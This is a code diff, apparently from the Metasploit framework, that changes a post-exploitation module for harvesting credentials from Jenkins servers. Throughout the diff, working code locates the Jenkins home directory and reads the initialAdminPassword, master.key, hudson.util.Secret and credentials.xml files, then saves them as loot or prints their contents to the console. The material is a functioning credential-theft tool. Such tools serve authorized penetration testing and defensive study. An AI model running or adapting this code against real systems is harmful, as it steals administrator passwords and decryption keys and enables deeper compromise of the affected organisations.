@@ -33,6 +33,7 @@ class MetasploitModule < Msf::Post
     )
     register_options(
       [
+        OptString.new('JENKINS_HOME', [ false, 'Set to the home directory of Jenkins. The Linux versions default to /var/lib/jenkins, but C:\\\\ProgramData\\\\Jenkins\\\\.jenkins on Windows.', ]),
         OptBool.new('STORE_LOOT', [false, 'Store files in loot (will simply output file to console if set to false).', true]),
         OptBool.new('SEARCH_JOBS', [false, 'Search through job history logs for interesting keywords. Increases runtime.', false])
       ]
@@ -61,15 +62,17 @@ class MetasploitModule < Msf::Post
   end
 
   def parse_credentialsxml(file)
-    vprint_status('Parsing credentials.xml...')
+    # Newer versions of Jenkins do not create `credentials.xml` until credentials have been added via Jenkins client
+    # tested on versions 2.401.1, 2.346.3
     if exists?(file)
+      vprint_status('Parsing credentials.xml...')
       f = read_file(file)
       if datastore['STORE_LOOT']
         loot_path = store_loot('jenkins.creds', 'text/xml', session, f, file)
         vprint_status("File credentials.xml saved to #{loot_path}")
       end
     else
-      print_error('Could not read credentials.xml...')
+      vprint_status('There is no credential.xml file present')
     end
 
     xml_doc = Nokogiri::XML(f)
@@ -296,40 +299,82 @@ class MetasploitModule < Msf::Post
     when 'windows'
       master_key_path = "#{home}\\secrets\\master.key"
       hudson_secret_key_path = "#{home}\\secrets\\hudson.util.Secret"
+      initial_admin_password_path = "#{home}\\secrets\\initialAdminPassword"
     when 'nix'
       master_key_path = "#{home}/secrets/master.key"
       hudson_secret_key_path = "#{home}/secrets/hudson.util.Secret"
+      initial_admin_password_path = "#{home}/secrets/initialAdminPassword"
     end
 
-    if exists?(master_key_path) && exists?(hudson_secret_key_path)
+    # Newer versions of Jenkins have an `initialAdminPassword` which contains the initial password set when configuring Jenkins
+    # tested on versions 2.401.1, 2.346.3, 2.103
+    if exists?(initial_admin_password_path)
+      initial_admin_password = read_file(initial_admin_password_path).strip
+
+      if datastore['STORE_LOOT']
+        loot_path = store_loot('initialAdminPassword', 'text/plain', session, initial_admin_password)
+        print_status("File initialAdminPassword saved to #{loot_path}")
+      else
+        print_status("File initialAdminPassword contents: #{initial_admin_password}")
+      end
+    else
+      print_error 'Cannot read initialAdminPassword...'
+    end
+
+    if exists?(master_key_path)
       @master_key = read_file(master_key_path)
+
+      if datastore['STORE_LOOT']
+        loot_path = store_loot('master.key', 'text/plain', session, @master_key)
+        print_status("File master.key saved to #{loot_path}")
+      else
+        print_status("File master.key contents: #{@master_key}")
+      end
+    else
+      print_error 'Cannot read master.key...'
+    end
+
+    # Newer versions of Jenkins do not create `hudson.util.Secret` until credentials have been added via Jenkins client
+    # tested on versions 2.401.1, 2.346.3
+    if exists?(hudson_secret_key_path)
       @hudson_secret_key = read_file(hudson_secret_key_path)
 
       if datastore['STORE_LOOT']
-        loot_path = store_loot('master.key', 'application/octet-stream', session, @master_key)
-        vprint_status("File master.key saved to #{loot_path}")
         loot_path = store_loot('hudson.util.secret', 'application/octet-stream', session, @hudson_secret_key)
-        vprint_status("File hudson.util.Secret saved to #{loot_path}")
+        print_status("File hudson.util.Secret saved to #{loot_path}")
       end
     else
-      print_error 'Cannot read master.key or hudson.util.Secret...'
-      print_error 'Encrypted strings will not be able to be decrypted...'
-      return
+      print_error 'Cannot read hudson.util.Secret...'
     end
   end
 
   def find_home(platform)
+    if datastore['JENKINS_HOME']
+      if exist?(datastore['JENKINS_HOME'] + '/secret.key.not-so-secret')
+        return datastore['JENKINS_HOME']
+      end
+      print_status(datastore['JENKINS_HOME'] + ' does not seem to contain secrets.')
+    end
+
     print_status('Searching for Jenkins directory... This could take some time...')
     case platform
     when 'windows'
-      case session.type
-      when 'meterpreter'
-        home = session.fs.file.search(nil, 'secret.key.not-so-secret')[0]['path']
+      if exists?('C:\\ProgramData\\Jenkins\\.jenkins\\secret.key.not-so-secret')
+        home = 'C:\\ProgramData\\Jenkins\\.jenkins\\'
       else
-        home = cmd_exec('cmd.exe', "/c dir /b /s c:\*secret.key.not-so-secret", timeout = 120).split('\\')[0..-2].join('\\').strip
+        case session.type
+        when 'meterpreter'
+          home = session.fs.file.search(nil, 'secret.key.not-so-secret')[0]['path']
+        else
+          home = cmd_exec('cmd.exe', "/c dir /b /s c:\*secret.key.not-so-secret", 120).split('\\')[0..-2].join('\\').strip
+        end
       end
     when 'nix'
-      home = cmd_exec('find', "/ -name 'secret.key.not-so-secret' 2>/dev/null", timeout = 120).split('/')[0..-2].join('/').strip
+      if exists?('/var/lib/jenkins/secret.key.not-so-secret')
+        home = '/var/lib/jenkins/'
+      else
+        home = cmd_exec('find', "/ -name 'secret.key.not-so-secret' 2>/dev/null", 120).split('/')[0..-2].join('/').strip
+      end
     end
     fail_with(Failure::NotFound, 'No Jenkins installation found or readable, exiting...') if !exist?(home)
     print_status("Found Jenkins installation at #{home}")
